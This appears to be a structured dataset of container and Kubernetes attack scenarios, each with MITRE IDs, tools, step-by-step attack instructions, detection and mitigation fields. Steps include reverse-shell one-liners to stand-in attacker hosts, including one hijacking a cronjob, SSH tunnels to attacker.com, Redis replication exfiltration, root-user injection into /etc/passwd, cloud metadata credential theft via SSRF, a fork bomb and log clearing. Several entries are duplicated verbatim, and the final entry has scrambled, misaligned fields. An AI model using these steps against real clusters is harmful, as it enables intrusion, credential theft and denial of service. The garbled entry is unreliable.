- **Tags**: #prometheus #intelligence #internalmetrics

## Privilege Escalation via /proc Access in Container

- **Attack Type**: Kernel Info Leak for Escalation
- **Target**: Linux Container
- **Vulnerability**: /proc exposed and no kernel patching
- **MITRE**: T1068
- **Impact**: Host escape and root-level privilege
- **Tools**: cat, uname, sysctl
- **Scenario**: Attacker reads /proc filesystem to fingerprint host and escape container.
- **Attack Steps**: 1. Inside container, attacker navigates to /proc and reads /proc/version and /proc/cmdline to get kernel version.2. Uses uname -a to fingerprint OS and patch level.3. Researches known kernel exploits using CVE databases (e.g., Dirty COW, overlayfs bypass).4. Compiles local exploit (if gcc installed) or downloads binary payload using curl/wget.5. Runs exploit to escalate privileges from container to root on host.6. Gains access to host filesystem, modifies cron or systemd for persistence.7. Cleans traces using history -c and log clearing techniques.
- **Detection**: EDR if deployed on host kernel
- **Solution**: Restrict /proc access, run containers with seccomp/AppArmor profiles
- **Tags**: #kernelinfo #procexploit #linuxcontainer

## Pivoting via Internal API Gateway Using Captured JWT

- **Attack Type**: Lateral API Abuse
- **Target**: API Gateway
- **Vulnerability**: Weak token reuse across service mesh
- **MITRE**: T1552.001
- **Impact**: API pivot across services using tokens
- **Tools**: curl, jwt-tool
- **Scenario**: JWT stolen from logs is used to access internal API Gateway exposed in mesh.
- **Attack Steps**: 1. Attacker dumps logs inside container and finds JWT used by microservice auth middleware.2. Decodes token using jwt-tool and confirms it's valid (no expiry, weak signing).3. Targets internal service mesh API gateway like Istio or Kong.4. Sends requests with JWT in Authorization: Bearer header to endpoints like /user/profile, /billing/data.5. API does not validate IP or context, accepts any bearer token.6. Attacker pivots from service A to B and escalates via API operations.7. If write-access is allowed, attacker modifies DB entries, injects SSRF payloads, or disables logging from APIs.
- **Detection**: API logs (if JWT validation is enabled)
- **Solution**: JWT rotation + context-bound validation
- **Tags**: #jwtabuse #apipivot #service_mesh

## Running Reverse Proxy in Container to Create Covert Channel

- **Attack Type**: Internal-to-External Covert Channel
- **Target**: Internal Service Pod
- **Vulnerability**: Outbound connectivity + no egress control
- **MITRE**: T1090.001
- **Impact**: Full data leak via covert channel
- **Tools**: ngrok, ssh, python3
- **Scenario**: Malicious container runs proxy to forward data from internal services to attacker.
- **Attack Steps**: 1. Attacker launches reverse proxy like ngrok or ssh -R from compromised container to their own server.2. Runs ngrok http 8080 or ssh -R 9090:localhost:80 user@attacker.com.3. Internal services (e.g., Redis, MongoDB) are forwarded to attacker machine.4. From outside, attacker accesses attacker.com:9090 and interacts with internal service as if it were local.5. This enables stealthy data exfiltration or RCE on internal apps.6. Tunnel operates over HTTPS or SSH, blending into legit traffic.7. Unless outbound connections are restricted, detection is very hard.
- **Detection**: Egress traffic to unknown IPs
- **Solution**: Block outbound proxy, inspect tunnel endpoints
- **Tags**: #covertproxy #egressbypass #reversetunnel

## DaemonSet Deployment via Misconfigured Role

- **Attack Type**: Persistence via DaemonSet Backdoor
- **Target**: Kubernetes Cluster
- **Vulnerability**: Overprivileged RBAC on deployment roles
- **MITRE**: T1053.007
- **Impact**: Persistent foothold on all cluster nodes
- **Tools**: kubectl, yaml
- **Scenario**: Attacker deploys a DaemonSet to run a malicious pod on every node in the cluster.
- **Attack Steps**: 1. Attacker compromises service account with create privileges on apps or controllers.2. Crafts daemonset.yaml with a malicious image (e.g., reverse shell or crypto miner).3. Uses kubectl apply -f daemonset.yaml to deploy to the cluster.4. All worker nodes start running this image as a pod.5. Image sends outbound beacon or receives attacker command via C2.6. Persistence is maintained even if initial pod is deleted.7. Blue team might see unusual traffic or CPU spike on all nodes.
- **Detection**: K8s audit logs, node resource monitoring
- **Solution**: Limit role bindings, validate controller creation
- **Tags**: #daemonset #rbacmisuse #k8spersistence

## DNS Rebinding via Internal DNS Abuse

- **Attack Type**: DNS Trick to Reach Internal Services
- **Target**: Containerized Web App
- **Vulnerability**: No rebinding protection in internal apps
- **MITRE**: T1565.001
- **Impact**: External → internal attack redirection
- **Tools**: dig, browser, custom DNS
- **Scenario**: DNS rebinding tricks app to load attacker content while thinking it’s internal.
- **Attack Steps**: 1. Attacker hosts malicious DNS server that resolves victim domain to external IP first, then internal IP on second request.2. User container loads attacker-controlled page or makes fetch call.3. Browser caches DNS and on refresh, points to internal service (e.g., api.internal.svc.local).4. Attacker’s JS gains access to sensitive internal endpoints.5. Useful for SSRF-style attacks or stealing internal tokens.6. Many apps are not protected against host-header mismatch or DNS rebinding.7. Can lead to full internal data access without initial RCE.
- **Detection**: DNS logs, unusual external → internal call patterns
- **Solution**: Use DNS pinning, host validation in apps
- **Tags**: #dnsrebind #svcattack #internaldns

## Mounting HostPath to /etc and Tampering with Configs

- **Attack Type**: HostPath Volume Abuse
- **Target**: Host Node Filesystem
- **Vulnerability**: Overpermissive hostPath volume
- **MITRE**: T1200
- **Impact**: Host user manipulation and privilege access
- **Tools**: echo, bash, mount
- **Scenario**: Container uses hostPath mount to overwrite /etc/passwd, adding root user.
- **Attack Steps**: 1. Container is launched with hostPath mounted from host /etc:/mnt/etc.2. Inside container, attacker navigates to /mnt/etc/passwd.3. Appends new line attacker:x:0:0:root:/root:/bin/bash.4. Restarts host services or triggers reboot.5. Attacker now has root login on host via this injected user.6. Can SSH into host or escalate further depending on system.7. This attack bypasses container sandbox entirely through mount abuse.
- **Detection**: Host file integrity alerts, change audit
- **Solution**: Avoid hostPath, use restricted volumes only
- **Tags**: #hostpath #etcabuse #privilegecontainer

## Lateral Movement via Exploiting Redis Misconfig

- **Attack Type**: Redis to Reverse Shell
- **Target**: Redis Container
- **Vulnerability**: Module load & no-auth Redis
- **MITRE**: T1059.006
- **Impact**: Remote command execution inside Redis
- **Tools**: redis-cli, nc, msfvenom
- **Scenario**: Use of Redis SLAVEOF or module load to execute code in internal Redis server.
- **Attack Steps**: 1. Attacker accesses Redis with no AUTH from container.2. Uses SLAVEOF attacker-ip 6379 to exfiltrate all DB to remote Redis.3. Optionally loads malicious module using MODULE LOAD /tmp/mymodule.so if module loading is enabled.4. Module crafted to spawn shell or execute arbitrary commands.5. Executes commands like ! bash -i >& /dev/tcp/attacker/4444 0>&1 from Redis.6. This gives reverse shell to attacker.7. Attack is very stealthy if Redis runs in isolated VPC or subnet with poor monitoring.
- **Detection**: Redis logs, reverse shell detection
- **Solution**: Disable module load, require password, use ACLs
- **Tags**: #redis #moduleload #reverse_shell

## Accessing Cloud Metadata API from Compromised Pod

- **Attack Type**: Metadata Service Exploitation
- **Target**: Cloud-Based Container
- **Vulnerability**: Metadata API exposed to container
- **MITRE**: T1552.004
- **Impact**: Cloud account takeover from within container
- **Tools**: curl, aws-cli, gcloud
- **Scenario**: Attacker accesses 169.254.169.254 metadata service from within a compromised container.
- **Attack Steps**: 1. Attacker gains access to a running container via misconfiguration or remote exploit.2. Inside the container, attacker identifies cloud environment (e.g., AWS) via instance hints like /sys/devices/virtual/dmi/id/board_vendor.3. Executes curl http://169.254.169.254/latest/meta-data/ to explore metadata.4. Retrieves IAM role credentials using curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME.5. Uses aws configure to set environment and aws sts get-caller-identity to confirm access.6. Executes operations like aws s3 ls, aws ec2 describe-instances, or gcloud compute instances list.7. Escalates privileges by spawning cloud resources, setting new IAM users, or creating persistence.
- **Detection**: VPC flow logs, CloudTrail, metadata API hits
- **Solution**: Enforce IMDSv2 (AWS), block metadata IPs, use workload identity tokens
- **Tags**: #metadataapi #cloudpivot #iamabuse

## Lateral Movement Using SSH Key Found in Mounted Volume

- **Attack Type**: SSH Key Reuse from Shared Volume
- **Target**: Shared-Mount Container
- **Vulnerability**: Developer secrets mounted insecurely
- **MITRE**: T1552.004
- **Impact**: Lateral SSH access using trusted key
- **Tools**: ssh, grep, mount, bash
- **Scenario**: SSH private key mounted into container is reused to pivot into other systems.
- **Attack Steps**: 1. Container mounts /opt/shared/keys directory from host where developers left SSH keys.2. Attacker explores /opt/shared/keys/id_rsa inside container.3. Uses grep to find usernames or IPs associated with key.4. Tests key on nearby hosts: ssh -i id_rsa user@10.0.2.15.5. Gains SSH access to internal staging servers or peer containers using same key.6. Once inside, attacker continues pivoting, dumping configs, and moving laterally.7. Since keys are reused across environments, attacker may access prod unintentionally.8. The SSH activity blends in unless unusual IP triggers alert.
- **Detection**: SSH logs on target host
- **Solution**: Never mount sensitive keys to containers, rotate keys regularly
- **Tags**: #sshkeyleak #volumemount #lateralpivot

## Enumerating and Exploiting Prometheus via Internal Access

- **Attack Type**: Internal Monitoring Tool Abuse
- **Target**: Prometheus Pod
- **Vulnerability**: Unauthenticated internal monitoring exposed
- **MITRE**: T1213
- **Impact**: Intelligence gathering for attack planning
- **Tools**: curl, promQL, browser
- **Scenario**: Prometheus dashboard exposed on internal port is accessed and queried by attacker.
- **Attack Steps**: 1. Compromised container runs netstat -tulpn or nmap to find open internal services.2. Prometheus found at http://prometheus.svc.cluster.local:9090/.3. Attacker queries /api/v1/targets and /api/v1/series to map monitored services.4. Extracts labels and metadata that reveal container names, IPs, open ports, pod names.5. Explores query features using PromQL to track memory/cpu of sensitive services.6. No authentication on Prometheus makes it a goldmine of internal observability data.7. Attacker uses insights to plan resource exhaustion or target high-value pods (e.g., DB pods with spikes).
- **Detection**: Internal service access logs
- **Solution**: Use auth proxy on dashboards, IP allowlist
- **Tags**: #prometheus #intelligence #internalmetrics

## Privilege Escalation via /proc Access in Container

- **Attack Type**: Kernel Info Leak for Escalation
- **Target**: Linux Container
- **Vulnerability**: /proc exposed and no kernel patching
- **MITRE**: T1068
- **Impact**: Host escape and root-level privilege
- **Tools**: cat, uname, sysctl
- **Scenario**: Attacker reads /proc filesystem to fingerprint host and escape container.
- **Attack Steps**: 1. Inside container, attacker navigates to /proc and reads /proc/version and /proc/cmdline to get kernel version.2. Uses uname -a to fingerprint OS and patch level.3. Researches known kernel exploits using CVE databases (e.g., Dirty COW, overlayfs bypass).4. Compiles local exploit (if gcc installed) or downloads binary payload using curl/wget.5. Runs exploit to escalate privileges from container to root on host.6. Gains access to host filesystem, modifies cron or systemd for persistence.7. Cleans traces using history -c and log clearing techniques.
- **Detection**: EDR if deployed on host kernel
- **Solution**: Restrict /proc access, run containers with seccomp/AppArmor profiles
- **Tags**: #kernelinfo #procexploit #linuxcontainer

## Pivoting via Internal API Gateway Using Captured JWT

- **Attack Type**: Lateral API Abuse
- **Target**: API Gateway
- **Vulnerability**: Weak token reuse across service mesh
- **MITRE**: T1552.001
- **Impact**: API pivot across services using tokens
- **Tools**: curl, jwt-tool
- **Scenario**: JWT stolen from logs is used to access internal API Gateway exposed in mesh.
- **Attack Steps**: 1. Attacker dumps logs inside container and finds JWT used by microservice auth middleware.2. Decodes token using jwt-tool and confirms it's valid (no expiry, weak signing).3. Targets internal service mesh API gateway like Istio or Kong.4. Sends requests with JWT in Authorization: Bearer header to endpoints like /user/profile, /billing/data.5. API does not validate IP or context, accepts any bearer token.6. Attacker pivots from service A to B and escalates via API operations.7. If write-access is allowed, attacker modifies DB entries, injects SSRF payloads, or disables logging from APIs.
- **Detection**: API logs (if JWT validation is enabled)
- **Solution**: JWT rotation + context-bound validation
- **Tags**: #jwtabuse #apipivot #service_mesh

## Running Reverse Proxy in Container to Create Covert Channel

- **Attack Type**: Internal-to-External Covert Channel
- **Target**: Internal Service Pod
- **Vulnerability**: Outbound connectivity + no egress control
- **MITRE**: T1090.001
- **Impact**: Full data leak via covert channel
- **Tools**: ngrok, ssh, python3
- **Scenario**: Malicious container runs proxy to forward data from internal services to attacker.
- **Attack Steps**: 1. Attacker launches reverse proxy like ngrok or ssh -R from compromised container to their own server.2. Runs ngrok http 8080 or ssh -R 9090:localhost:80 user@attacker.com.3. Internal services (e.g., Redis, MongoDB) are forwarded to attacker machine.4. From outside, attacker accesses attacker.com:9090 and interacts with internal service as if it were local.5. This enables stealthy data exfiltration or RCE on internal apps.6. Tunnel operates over HTTPS or SSH, blending into legit traffic.7. Unless outbound connections are restricted, detection is very hard.
- **Detection**: Egress traffic to unknown IPs
- **Solution**: Block outbound proxy, inspect tunnel endpoints
- **Tags**: #covertproxy #egressbypass #reversetunnel

## DaemonSet Deployment via Misconfigured Role

- **Attack Type**: Persistence via DaemonSet Backdoor
- **Target**: Kubernetes Cluster
- **Vulnerability**: Overprivileged RBAC on deployment roles
- **MITRE**: T1053.007
- **Impact**: Persistent foothold on all cluster nodes
- **Tools**: kubectl, yaml
- **Scenario**: Attacker deploys a DaemonSet to run a malicious pod on every node in the cluster.
- **Attack Steps**: 1. Attacker compromises service account with create privileges on apps or controllers.2. Crafts daemonset.yaml with a malicious image (e.g., reverse shell or crypto miner).3. Uses kubectl apply -f daemonset.yaml to deploy to the cluster.4. All worker nodes start running this image as a pod.5. Image sends outbound beacon or receives attacker command via C2.6. Persistence is maintained even if initial pod is deleted.7. Blue team might see unusual traffic or CPU spike on all nodes.
- **Detection**: K8s audit logs, node resource monitoring
- **Solution**: Limit role bindings, validate controller creation
- **Tags**: #daemonset #rbacmisuse #k8spersistence

## DNS Rebinding via Internal DNS Abuse

- **Attack Type**: DNS Trick to Reach Internal Services
- **Target**: Containerized Web App
- **Vulnerability**: No rebinding protection in internal apps
- **MITRE**: T1565.001
- **Impact**: External → internal attack redirection
- **Tools**: dig, browser, custom DNS
- **Scenario**: DNS rebinding tricks app to load attacker content while thinking it’s internal.
- **Attack Steps**: 1. Attacker hosts malicious DNS server that resolves victim domain to external IP first, then internal IP on second request.2. User container loads attacker-controlled page or makes fetch call.3. Browser caches DNS and on refresh, points to internal service (e.g., api.internal.svc.local).4. Attacker’s JS gains access to sensitive internal endpoints.5. Useful for SSRF-style attacks or stealing internal tokens.6. Many apps are not protected against host-header mismatch or DNS rebinding.7. Can lead to full internal data access without initial RCE.
- **Detection**: DNS logs, unusual external → internal call patterns
- **Solution**: Use DNS pinning, host validation in apps
- **Tags**: #dnsrebind #svcattack #internaldns

## Mounting HostPath to /etc and Tampering with Configs

- **Attack Type**: HostPath Volume Abuse
- **Target**: Host Node Filesystem
- **Vulnerability**: Overpermissive hostPath volume
- **MITRE**: T1200
- **Impact**: Host user manipulation and privilege access
- **Tools**: echo, bash, mount
- **Scenario**: Container uses hostPath mount to overwrite /etc/passwd, adding root user.
- **Attack Steps**: 1. Container is launched with hostPath mounted from host /etc:/mnt/etc.2. Inside container, attacker navigates to /mnt/etc/passwd.3. Appends new line attacker:x:0:0:root:/root:/bin/bash.4. Restarts host services or triggers reboot.5. Attacker now has root login on host via this injected user.6. Can SSH into host or escalate further depending on system.7. This attack bypasses container sandbox entirely through mount abuse.
- **Detection**: Host file integrity alerts, change audit
- **Solution**: Avoid hostPath, use restricted volumes only
- **Tags**: #hostpath #etcabuse #privilegecontainer

## Lateral Movement via Exploiting Redis Misconfig

- **Attack Type**: Redis to Reverse Shell
- **Target**: Redis Container
- **Vulnerability**: Module load & no-auth Redis
- **MITRE**: T1059.006
- **Impact**: Remote command execution inside Redis
- **Tools**: redis-cli, nc, msfvenom
- **Scenario**: Use of Redis SLAVEOF or module load to execute code in internal Redis server.
- **Attack Steps**: 1. Attacker accesses Redis with no AUTH from container.2. Uses SLAVEOF attacker-ip 6379 to exfiltrate all DB to remote Redis.3. Optionally loads malicious module using MODULE LOAD /tmp/mymodule.so if module loading is enabled.4. Module crafted to spawn shell or execute arbitrary commands.5. Executes commands like ! bash -i >& /dev/tcp/attacker/4444 0>&1 from Redis.6. This gives reverse shell to attacker.7. Attack is very stealthy if Redis runs in isolated VPC or subnet with poor monitoring.
- **Detection**: Redis logs, reverse shell detection
- **Solution**: Disable module load, require password, use ACLs
- **Tags**: #redis #moduleload #reverse_shell

## Lateral Pivot via Internal Redis Abuse

- **Attack Type**: No-Auth Redis Misuse
- **Target**: Internal Redis Pod
- **Vulnerability**: Redis open and unauthenticated
- **MITRE**: T1210
- **Impact**: Code injection, backdoor creation
- **Tools**: redis-cli, nc, redis-server
- **Scenario**: Attacker accesses internal Redis without auth and uses it to pivot or manipulate services.
- **Attack Steps**: 1. After gaining shell access to a container, attacker checks common Redis ports with nc -zv 10.0.0.30 6379.2. Upon finding Redis open without authentication, connects using redis-cli -h 10.0.0.30.3. Issues INFO, CONFIG GET *, KEYS * to dump keys, credentials, or configurations.4. Abuses Redis as file drop: uses CONFIG SET dir /root/.ssh/ and SET + SAVE to write authorized_keys.5. Uses Redis host for further lateral movement or persistence if it has system access.6. Injects reverse shell payload in Redis key for retrieval.7. If misconfigured, attacker can replicate master-slave setup to extract data externally.
- **Detection**: Redis server logs (if configured)
- **Solution**: Enable Redis auth, bind Redis only to localhost or service mesh
- **Tags**: #redisexploit #unauthdb #internalpivot

## Exploiting Kubernetes Metadata Endpoints via SSRF

- **Attack Type**: SSRF to Metadata Access
- **Target**: Cloud Metadata Endpoint
- **Vulnerability**: No SSRF filter and open metadata IP
- **MITRE**: T1213.003
- **Impact**: IAM credential theft and pivot to cloud
- **Tools**: curl, Burp, SSRFMap
- **Scenario**: Abusing internal SSRF bugs to access K8s or cloud metadata endpoints.
- **Attack Steps**: 1. Attacker finds a web application endpoint like /proxy?url= vulnerable to SSRF.2. Sends request: curl http://webapp/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/.3. Gets IAM role name, then hits: /latest/meta-data/iam/security-credentials/<rolename> to dump temp creds.4. Uses aws sts get-caller-identity to confirm access.5. Accesses S3 buckets, EC2 describe APIs, Lambda functions using harvested creds.6. May automate further exploitation using SSRFMap, HTTP toolkits.7. Entire attack bypasses firewalls since traffic remains internal via app SSRF.
- **Detection**: Application logs, IAM CloudTrail
- **Solution**: Block access to metadata IP, SSRF validation & allowlist
- **Tags**: #ssrf #metadata #awscreds

## Lateral Movement via Misconfigured Service Mesh

- **Attack Type**: Service Mesh Lateral Pivot
- **Target**: Service Mesh Network
- **Vulnerability**: Mesh misconfiguration, no mTLS
- **MITRE**: T1573.002
- **Impact**: East-west unauthorized movement
- **Tools**: istioctl, curl, envoy
- **Scenario**: Compromised pod abuses service mesh routing to communicate with unauthorized services.
- **Attack Steps**: 1. Attacker compromises a pod that is part of Istio/Linkerd mesh.2. Uses service mesh sidecar (Envoy proxy) to inspect allowed routes.3. Sends crafted internal traffic via proxy to unauthorized microservices: curl http://ratings.default.svc.cluster.local:9080.4. If routing policies are too permissive, gains access to billing, identity, or admin APIs.5. If mTLS is off, attacker can even spoof service identities.6. Service-to-service auth is bypassed via Envoy or eavesdropped.7. Post access, attacker exfiltrates data or injects unauthorized requests to escalate.
- **Detection**: Mesh telemetry, envoy logs, service tracing
- **Solution**: Enforce strict mesh policies + mandatory mTLS
- **Tags**: #servicemeshpivot #istio #envoyabuse

## Cloud IAM Privilege Escalation from Compromised Container

- **Attack Type**: IAM Role Abuse via Cloud SDK
- **Target**: Cloud Account
- **Vulnerability**: IAM keys in containers, weak policy config
- **MITRE**: T1078
- **Impact**: Full cloud takeover from container breach
- **Tools**: AWS CLI, gcloud, bash
- **Scenario**: Using exposed IAM creds in container to escalate privileges in AWS/GCP.
- **Attack Steps**: 1. Attacker finds IAM keys in ~/.aws/credentials or GOOGLE_APPLICATION_CREDENTIALS in the container.2. Uses keys to query current privileges: aws iam get-user, gcloud auth list.3. If allowed, invokes aws iam attach-user-policy, gcloud projects set-iam-policy to escalate access.4. Explores cloud resources, launches VMs, and adds users to privileged roles.5. May create access tokens, long-lived credentials, or backdoors via cloud functions.6. Maintains persistence across workloads even if original container is destroyed.7. Entire cloud account may be compromised due to a single container leak.
- **Detection**: IAM CloudTrail logs, resource diffs
- **Solution**: Rotate keys, inject creds securely, audit least privilege
- **Tags**: #iamleak #cloudpivot #container2cloud

## Exploiting Open Internal APIs via Kubernetes DNS

- **Attack Type**: Internal API Enumeration via DNS
- **Target**: K8s Internal APIs
- **Vulnerability**: Open DNS resolution, no API auth
- **MITRE**: T1590
- **Impact**: Info leakage + lateral movement foundation
- **Tools**: dig, curl, nmap
- **Scenario**: Mapping open APIs by resolving internal K8s service names and probing each service.
- **Attack Steps**: 1. Attacker has shell on pod with DNS access.2. Uses dig to resolve wildcard: dig +short *.default.svc.cluster.local.3. Collects list of internal services like users-api, logs-service, vault, etc.4. Probes each with curl on common ports (8080, 443, 5000) and endpoints like /metrics, /debug, /config.5. Looks for no-auth or token-auth APIs returning sensitive data.6. Dumps configs, secrets, database endpoints, or credentials.7. Uses gathered data to pivot to higher-value services or backend systems.
- **Detection**: DNS logs, container access monitoring
- **Solution**: Enable auth on internal APIs, limit pod DNS resolution
- **Tags**: #dnsrecon #internalapi #k8squery

## Exploiting Pod with HostNetwork Access

- **Attack Type**: Host Network Abuse
- **Target**: K8s Pod with hostNetwork
- **Vulnerability**: Misused host network setting
- **MITRE**: T1040
- **Impact**: Traffic sniffing, DoS, stealth access
- **Tools**: tcpdump, iptables, nmap
- **Scenario**: Pod running with hostNetwork: true used to sniff, scan, or interfere with host’s network.
- **Attack Steps**: 1. Attacker identifies pod spec allows hostNetwork: true.2. Enters pod and gains access to host network stack.3. Uses tcpdump -i eth0 port 443 to sniff HTTPS metadata.4. Sends raw packets or ARP requests to spoof services inside host network.5. Scans services outside pod CIDR but in host’s subnet.6. Installs iptables rules to redirect or block traffic.7. Potentially causes DoS, traffic sniffing, or escalates via unfiltered packets.
- **Detection**: Host logs, iptables monitoring, network policy
- **Solution**: Avoid hostNetwork, use network policies, eBPF tracing
- **Tags**: #hostnetwork #sniffing #podnetworkabuse

## Pivoting via Internal Kubernetes Dashboard

- **Attack Type**: K8s UI Abuse (No Auth)
- **Target**: Kubernetes Dashboard
- **Vulnerability**: No UI auth, exposed to internal containers
- **MITRE**: T1069
- **Impact**: Cluster takeover via misused dashboard
- **Tools**: browser, kubectl proxy, nmap
- **Scenario**: Attacker finds Kubernetes Dashboard running without authentication.
- **Attack Steps**: 1. Attacker identifies dashboard exposed on http://dashboard.k8s.local:8001.2. Port scanned from inside container confirms it's reachable.3. Opens dashboard in browser via kubectl port-forward or direct HTTP.4. No authentication is required; full UI access given.5. Uses UI to create new pods, delete deployments, and read secrets.6. Deploys backdoored containers or DaemonSets for persistence.7. Takes over full cluster by chaining with RBAC issues.
- **Detection**: Ingress logs, dashboard audit logs
- **Solution**: Require auth + RBAC on UI, expose only via gateway
- **Tags**: #k8sdashboard #noauth #clusterabuse

## Container Escape via Vulnerable runc (CVE-2019-5736)

- **Attack Type**: Namespace Escape via runc Exploit
- **Target**: Host System
- **Vulnerability**: CVE-2019-5736 vulnerable runc runtime
- **MITRE**: T1068
- **Impact**: Root container escape to host
- **Tools**: exploit script, docker
- **Scenario**: Attacker abuses CVE-2019-5736 to escape container and execute code on host.
- **Attack Steps**: 1. Attacker executes specially crafted binary in container that overwrites /proc/self/exe (runc binary).2. Binary is crafted with malicious code to overwrite host’s runc when container exits or attaches.3. Triggered via docker exec, the payload gets executed as root on host.4. Attacker gains shell on host, installs backdoors, modifies host binaries.5. Host compromise is complete; attacker has persistent root access.6. This exploit needs runc < 1.0.0-rc6 and certain container runtime setups.7. Defense includes version patching and runtime syscall restrictions.
- **Detection**: Syscall monitoring, container runtime logs
- **Solution**: Update runc, AppArmor/Seccomp enforcement
- **Tags**: #runc #cve20195736 #containereescape

## Reverse Shell via Internal Cronjob Hijack

- **Attack Type**: Cronjob Abuse for Callback Shell
- **Target**: K8s Cronjob
- **Vulnerability**: Writable cronjob spec, weak RBAC
- **MITRE**: T1059.004
- **Impact**: Persistent shell into cluster
- **Tools**: kubectl, netcat
- **Scenario**: Attacker hijacks existing K8s cronjob and adds reverse shell payload.
- **Attack Steps**: 1. Attacker has write access to namespace or service account with cronjob privileges.2. Lists existing cronjobs via kubectl get cronjobs -n app.3. Edits the job: kubectl edit cronjob report-sender.4. Replaces command with: bash -i >& /dev/tcp/attacker-ip/4444 0>&1.5. Sets up listener on external server using nc -lvnp 4444.6. Waits for cronjob to run and receive reverse shell.7. Uses shell to move laterally or deploy persistence mechanisms.
- **Detection**: Cronjob logs, reverse shell monitoring
- **Solution**: Restrict cronjob edits, enforce least privilege SA
- **Tags**: #cronbackdoor #reverseshell #k8shijack

## Leveraging Internal File Shares Exposed to Containers

- **Attack Type**: SMB/NFS Share Abuse
- **Target**: Shared File Mounts
- **Vulnerability**: Exposed internal shares to containers
- **MITRE**: T1021.002
- **Impact**: Secret exfiltration and lateral tool staging
- **Tools**: showmount, smbclient, mount
- **Scenario**: Attacker finds open file shares (e.g., NFS, SMB) mounted in containers.
- **Attack Steps**: 1. Attacker checks /etc/fstab, /proc/mounts, or mount for file share mounts inside compromised container.2. Finds open NFS mount at /mnt/shared or SMB at /mnt/files.3. Lists files, downloads secrets: .pem, .env, backup.tar.gz, source code.4. Uses credentials or SSH keys inside files to access other systems.5. In case of read-write share, drops malicious binaries or auto-start scripts.6. Waits for other users or cronjobs to execute dropped payloads.7. Abuses file shares as backdoor or lateral bridge.
- **Detection**: NFS logs, SMB logs, container file activity
- **Solution**: Isolate shares, use read-only access, log mount ops
- **Tags**: #nfsabuse #filemountpivot #sharesexploit

## Stealing Tokens via Misconfigured Service Account Mount

- **Attack Type**: Service Account Token Theft
- **Target**: K8s API Server
- **Vulnerability**: Auto-mounted token with overprivileged RBAC
- **MITRE**: T1552.001
- **Impact**: Kubernetes API abuse & lateral cluster access
- **Tools**: kubectl, curl, base64
- **Scenario**: Attacker reads auto-mounted service account token inside container to access Kubernetes API.
- **Attack Steps**: 1. Attacker gains access to a container running in Kubernetes.2. Navigates to /var/run/secrets/kubernetes.io/serviceaccount/token to read the mounted token.3. Uses cat and optionally base64 to extract and decode it.4. Sends token with Authorization: Bearer <token> in requests to https://kubernetes.default.svc.5. Accesses resources (e.g., pods, secrets) depending on RBAC privileges of the service account.6. If privileges are high, the attacker could deploy backdoors, delete pods, or extract secrets.7. The token may be long-lived if rotation or TTL is not enforced.8. Full cluster compromise possible if bound to cluster-admin.
- **Detection**: API audit logs, service account token access
- **Solution**: Disable auto-mount SA tokens where unnecessary, enforce RBAC least privilege
- **Tags**: #serviceaccount #tokenabuse #k8sapi

## Container-to-Container Pivoting Using HTTP APIs

- **Attack Type**: East-West Traffic Exploitation
- **Target**: Container Services
- **Vulnerability**: No auth in internal service communication
- **MITRE**: T1571
- **Impact**: Pivoting between services to steal secrets
- **Tools**: curl, httpie, nmap
- **Scenario**: Using unauthenticated APIs between containers to pivot laterally inside the cluster.
- **Attack Steps**: 1. Attacker discovers open ports in nearby containers using nmap on the internal network.2. Finds container A has a microservice on port 5000 with /debug endpoint.3. Sends requests via curl http://container-a:5000/debug to extract internal info.4. Finds links to internal APIs of container B and container C.5. Uses info to chain access from one container to another (container B → C).6. Eventually reaches admin services or internal APIs that expose secrets.7. The absence of authentication or rate-limiting allows attacker to fully enumerate services.8. Ends with dumping environment variables, credentials, or backend DB URLs.
- **Detection**: Container-level network monitoring, HTTP request inspection
- **Solution**: Apply zero-trust principle, internal service auth via JWT or mTLS
- **Tags**: #containerpivot #eastwest #microserviceabuse

## Accessing Host Files via HostPath Misuse

- **Attack Type**: HostPath Volume Misuse
- **Target**: K8s Node Host
- **Vulnerability**: Unsafe hostPath volume + root pod
- **MITRE**: T1069.001
- **Impact**: Escalation from container to host OS
- **Tools**: bash, cat, vi
- **Scenario**: Attacker abuses pod with access to HostPath volume mount to read/write sensitive files on the node.
- **Attack Steps**: 1. Attacker gains shell in a pod with hostPath mounted (e.g., /etc, /root, /var/log).2. Navigates into /mnt/host/etc/shadow, /mnt/host/root/.ssh/, or similar using bash.3. Reads password hashes, SSH private keys, or configuration files.4. Uses this data to pivot into the host OS (e.g., SSH back in if exposed).5. If write permission is available, replaces binaries in /mnt/host/usr/bin with malicious versions.6. Alternatively, adds cronjobs or modifies init scripts to persist.7. May create new root users in /etc/passwd.8. This results in complete node compromise if left unchecked.
- **Detection**: File integrity monitoring, container runtime logs
- **Solution**: Avoid hostPath, use CSI drivers, enforce PodSecurity policies
- **Tags**: #hostpath #volumemount #containertoos

## Sidecar Container Misuse to Eavesdrop on Traffic

- **Attack Type**: Sidecar Eavesdropping
- **Target**: App + Sidecar Pods
- **Vulnerability**: Overprivileged sidecar with intercept power
- **MITRE**: T1040
- **Impact**: Internal traffic compromise & secret theft
- **Tools**: tcpdump, curl, mitmproxy
- **Scenario**: Attacker uses sidecar logging containers to read sensitive app data or intercept secrets.
- **Attack Steps**: 1. A logging or monitoring container is deployed as a sidecar.2. Attacker gains access to this sidecar (e.g., weak RBAC allows exec into it).3. Uses tools like tcpdump or mitmproxy to eavesdrop on internal traffic.4. Inspects HTTP requests, JWT tokens, and internal API calls.5. If app sends secrets via GET or POST, attacker captures them in cleartext.6. Could inject malicious requests directly from sidecar.7. Since traffic is often unencrypted in east-west flow, attacker reads session tokens and credentials.8. Escalates privileges or pivots using these captured secrets.
- **Detection**: Container logs, interface monitoring
- **Solution**: Limit sidecar capabilities, encrypt all traffic, apply mTLS
- **Tags**: #sidecar #networksniff #eavesdrop

## Breaking Isolation via Cgroup v1 Manipulation

- **Attack Type**: Cgroup Abuse for Resource Starvation
- **Target**: :& };:) to consume resources.<br>3. Consumes all available CPU or memory on the shared node.<br>4. Other containers on the same node start to crash due to lack of resources.<br>5. This results in Denial of Service across multiple workloads.<br>6. Cgroup v1 isolation doesn't enforce limits unless defined explicitly.<br>7. Attacker may also manipulate /sys/fs/cgroup/...` directly to alter constraints.8. This affects availability and could hide persistent containers.
- **Vulnerability**: Shared Node
- **MITRE**: No cgroup resource limits
- **Impact**: T1499
- **Tools**: stress-ng, bash
- **Scenario**: Attacker abuses lack of cgroup limits to exhaust CPU/mem and affect co-hosted containers.
- **Attack Steps**: 1. Attacker gets shell in a container running without CPU/memory limits.2. Installs stress-ng or uses bash fork bombs (`:(){ :
- **Detection**: DoS across pods or containers on the node
- **Solution**: Node resource monitoring, container OOM logs
